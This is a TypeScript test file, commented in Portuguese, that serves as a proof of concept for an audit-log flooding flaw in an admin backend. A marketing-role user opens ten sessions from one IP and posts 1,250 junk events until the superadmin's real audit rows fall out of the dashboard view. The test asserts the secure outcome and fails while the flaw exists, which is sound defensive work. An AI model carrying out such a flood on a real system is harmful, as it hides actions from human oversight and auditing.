// PoC (verificador independente): inundação da auditoria. Uma pessoa de cargo baixo (marketing), de um único IP,
// abre várias sessões pelo login (10/min por IP) e cada sessão tem a sua cota de 120/min em POST /api/audit/events
// (o limite da rota substitui o global de 600/min por IP). Em segundos as linhas lixo empurram para fora da chave
// auditoria.registros (a única fonte do painel: Auditoria, Segurança do painel, Modo de ataque, Equipe) todas as
// linhas reais do Superadmin. Este teste afirma o comportamento SEGURO e FALHA enquanto o problema existir.
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { FastifyInstance } from 'fastify'
import type { AuditEntry } from '@shared/audit'
import { newId } from '../src/lib/crypto'
import { AUDIT_KV_LIMIT } from '../src/modules/audit/kv'
import { api, cookieFrom, createTestApp, createUser, loginAs } from './helpers'

let app: FastifyInstance
let daniel: Awaited<ReturnType<typeof loginAs>>

async function insertWithdrawal(a: FastifyInstance) {
  const id = newId('SQ')
  await a.db.query(
    `insert into withdrawals (id, player_id, player_name, player_email, amount_cents, fee_cents, status, risk_level, risk_score,
                              risk_reasons, pix_key_type, pix_key_enc, reference, created_at, updated_at)
     values ($1, 'p1', 'Jogador Teste', 'jogador@exemplo.com', 300000, 0, 'pendente', 'baixo', 10, '["motivo"]'::jsonb, 'CPF', $2, 'E123', now(), now())`,
    [id, a.cipher.encrypt('12345678909')],
  )
  return id
}

beforeAll(async () => {
  app = await createTestApp()
  daniel = await loginAs(app, 'superadmin', { name: 'Daniel Carius', email: 'daniel@x2win.bet.br', password: 'SenhaForte2026' })
})
afterAll(async () => app.close())

describe('PoC r2 — inundação da auditoria esconde as ações reais do painel', () => {
  it('um único IP/pessoa de cargo baixo não deve conseguir tirar do painel as linhas reais da auditoria', async () => {
    // 1) ações reais do Superadmin, auditadas pelo servidor: login com senha e aprovação de saque
    const dLogin = await api(app, 'POST', '/api/auth/login', { ip: '200.10.10.10', body: { email: 'daniel@x2win.bet.br', password: 'SenhaForte2026' } })
    const saqueId = await insertWithdrawal(app)
    const approve = await api(app, 'POST', `/api/withdrawals/${saqueId}/approve`, { cookie: daniel.cookie, ip: '200.10.10.10' })
    console.log('[poc] Daniel login:', dLogin.statusCode, 'approve:', approve.statusCode)
    const before = (await api(app, 'GET', '/api/kv/auditoria.registros', { cookie: daniel.cookie, ip: '200.10.10.10' })).json().value as AuditEntry[]
    const danielBefore = before.filter((e) => e.actorId === daniel.user.id)
    console.log('[poc] kv before flood: rows =', before.length, 'Daniel rows =', danielBefore.length, JSON.stringify(danielBefore.map((e) => `${e.action}/${e.entity}`)))

    // 2) marketing loga 10 vezes do mesmo IP sem mandar cookie: 10 sessões ativas separadas
    const mkt = await createUser(app, { roleId: 'marketing', name: 'Mario Marketing', password: 'SenhaForte123' })
    const IP = '203.0.113.7'
    const cookies: string[] = []
    for (let i = 0; i < 10; i++) {
      const r = await api(app, 'POST', '/api/auth/login', { ip: IP, body: { email: mkt.email, password: mkt.password } })
      const c = cookieFrom(r)
      if (r.statusCode === 200 && c) cookies.push(c)
    }
    const activeSessions = await app.db.one<{ n: number }>(
      `select count(*)::int as n from sessions where user_id = $1 and revoked_at is null and stage = 'active'`,
      [mkt.id],
    )
    console.log('[poc] marketing sessions from', IP, '=', cookies.length, '(db active:', activeSessions?.n, ')')

    // 3) cada sessão manda 125 eventos lixo, todos ao mesmo tempo, do mesmo IP
    const t0 = Date.now()
    const reqs: Promise<{ statusCode: number }>[] = []
    for (const c of cookies) {
      for (let i = 0; i < 125; i++) {
        reqs.push(api(app, 'POST', '/api/audit/events', { cookie: c, ip: IP, body: { action: 'editar', entity: 'x', summary: 'x' } }))
      }
    }
    const results = await Promise.all(reqs)
    const ms = Date.now() - t0
    const byStatus = results.reduce<Record<number, number>>((acc, r) => ((acc[r.statusCode] = (acc[r.statusCode] ?? 0) + 1), acc), {})
    const accepted = byStatus[201] ?? 0
    console.log(`[poc] ${reqs.length} POST /api/audit/events from ${IP} in ${ms} ms ->`, JSON.stringify(byStatus))

    // 4) o que o painel vê (chave auditoria.registros, as 1000 mais recentes)
    const after = (await api(app, 'GET', '/api/kv/auditoria.registros', { cookie: daniel.cookie, ip: '200.10.10.10' })).json().value as AuditEntry[]
    const danielAfter = after.filter((e) => e.actorId === daniel.user.id)
    const notFlooder = after.filter((e) => e.actorId !== mkt.id)
    console.log('[poc] kv after flood: rows =', after.length, '(AUDIT_KV_LIMIT =', AUDIT_KV_LIMIT, ') Daniel rows =', danielAfter.length, 'non-flooder rows =', notFlooder.length)

    // 5) as linhas reais continuam no banco (só o painel deixou de vê-las)
    const dbDaniel = await app.db.one<{ n: number }>('select count(*)::int as n from audit_log where actor_id = $1', [daniel.user.id])
    const dbTotal = await app.db.one<{ n: number }>('select count(*)::int as n from audit_log')
    console.log('[poc] db: total rows =', dbTotal?.n, 'Daniel rows =', dbDaniel?.n)

    // SEGURO: o global de 600/min por IP vale também aqui; e as ações reais seguem visíveis no painel
    expect.soft(accepted, 'eventos aceitos de um único IP num minuto').toBeLessThanOrEqual(600)
    expect(danielAfter.length, 'linhas do Superadmin visíveis em auditoria.registros depois da inundação').toBe(danielBefore.length)
  }, 120_000)
})
